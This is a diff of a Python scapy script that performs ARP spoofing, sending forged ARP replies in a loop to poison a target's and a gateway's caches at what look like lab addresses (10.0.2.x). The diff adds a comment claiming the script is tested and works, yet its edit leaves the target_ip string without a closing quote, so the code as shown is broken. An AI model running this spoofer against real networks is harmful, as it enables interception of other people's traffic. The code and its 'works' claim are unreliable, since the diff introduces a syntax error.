@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+# tested - działa
 
 import scapy.all as scapy
 import time
@@ -22,11 +23,11 @@ def restore(destination_ip, source_ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False, verbose=False)
+    scapy.send(packet, verbose=False)
 
-target_ip = "10.0.2.7"
-gateway_ip = "10.0.2.1
-"
+target_ip = "10.0.2.7
+gateway_ip = "10.0.2.1"
+
 try:
     sent_packets_count = 0  
     while True:
